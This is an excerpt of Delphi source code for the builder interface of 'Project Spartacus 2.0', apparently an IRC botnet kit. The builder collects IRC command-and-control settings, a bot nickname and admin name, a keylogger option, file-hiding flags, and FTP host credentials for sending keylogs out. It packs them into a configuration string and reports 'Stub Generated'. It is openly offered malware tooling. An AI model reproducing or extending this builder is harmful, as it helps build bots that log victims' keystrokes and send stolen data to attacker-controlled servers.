...
uses
  ...
  Vcl.StdCtrls, Vcl.ComCtrls, Vcl.ImgList, Vcl.Styles.Utils.ComCtrls,
  Vcl.Styles.Utils.Menus,
  Vcl.Styles.Utils.SysStyleHook,
  Vcl.Styles.Utils.SysControls, Vcl.Styles.Utils.Forms,
  Vcl.Styles.Utils.StdCtrls, Vcl.Styles.Utils.ScreenTips, IdContext,
  IdBaseComponent,
  IdComponent, IdTCPConnection, IdTCPClient, IdCmdTCPClient, IdIRC,
  DH_Form_Effects, DH_Builder_Tools, DH_Server_Manager;
...
type
  TFormHome = class(TForm)
    ...
    panelAbout: TPanel;
    labelAbout: TLabel;
    ilIconosGroup2: TImageList;
    ilIconosGroup3: TImageList;
    tsConfiguration: TTabSheet;
    tsKeylogger: TTabSheet;
    cbUseKeylogger: TCheckBox;
    gbFTPConfiguration: TGroupBox;
    lblFTPHost: TLabel;
    lblFTP_User: TLabel;
    lblFTP_Password: TLabel;
    lblFTP_Path: TLabel;
    txtFTP_Host: TEdit;
    txtFTP_User: TEdit;
    txtFTP_Password: TEdit;
    txtFTP_Path: TEdit;
    ...
    btnGenerate: TButton;
    tsIRC: TTabSheet;
    gbIRC_Configuration: TGroupBox;
    lblIRC_Host: TLabel;
    lblOrThis: TLabel;
    lblIRC_Port: TLabel;
    lblIRC_Channel: TLabel;
    txtHost: TEdit;
    txtHost2: TEdit;
    txtPort: TEdit;
    txtChannel: TEdit;
    gbSelectNickname: TGroupBox;
    rbUseThisNick: TRadioButton;
    txtBotNick: TEdit;
    rbUseNickGenerated: TRadioButton;
    gbConfiguration: TGroupBox;
    lblYourNick: TLabel;
    lblTimeoutForAnswers: TLabel;
    txtAdmin: TEdit;
    txtTimeout: TEdit;
    udTimeout: TUpDown;
...
begin
  ...
  begin
    ...
    message_box('Project Spartacus 2.0', 'Icon loaded', 'Information');
  end
  else
  begin
    message_box('Project Spartacus 2.0', 'Icon not found', 'Warning');
  end;
end;
...
begin
  ...
  if (txtAdmin.Text = '') or (txtTimeout.Text = '') then
  begin
    message_box('Project Spartacus 2.0', 'Enter Configuration', 'Warning');
  end
  else
  begin
    ...
    nick := txtBotNick.Text;
    admin := txtAdmin.Text;
    timeout_response := txtTimeout.Text;

    ftp_host := txtFTP_Host.Text;
    ftp_user := txtFTP_User.Text;
    ftp_pass := txtFTP_Password.Text;
    ftp_path := txtFTP_Path.Text;

    if (rbUseNickGenerated.Checked) then
    begin
      op_generate_nick := '1';
    end
    else
    ...
    configuration := '[host]' + host + '[host][host2]' + host2 + '[host2]' +
      '[port]' + port + '[port][channel]' + channel + '[channel][nick]' + nick +
      '[nick][admin]' + admin + '[admin][timeout_response]' + timeout_response +
      '[timeout_response][op_generate_nick]' + op_generate_nick +
      '[op_generate_nick]';
    ...
    configuration := configuration + '[active]1[active][op_hide_files]' +
      ...
      '[op_keylogger][ftp_host]' + ftp_host + '[ftp_host][ftp_user]' + ftp_user
      + '[ftp_user][ftp_pass]' + ftp_pass + '[ftp_pass][ftp_path]' + ftp_path +
      '[ftp_path]';
    ...
    begin
      ...
      message_box('Project Spartacus 2.0', 'Stub Generated', 'Information');

    end
    else
    begin
      message_box('Project Spartacus 2.0', 'Error generating stub', 'Error');
    end;
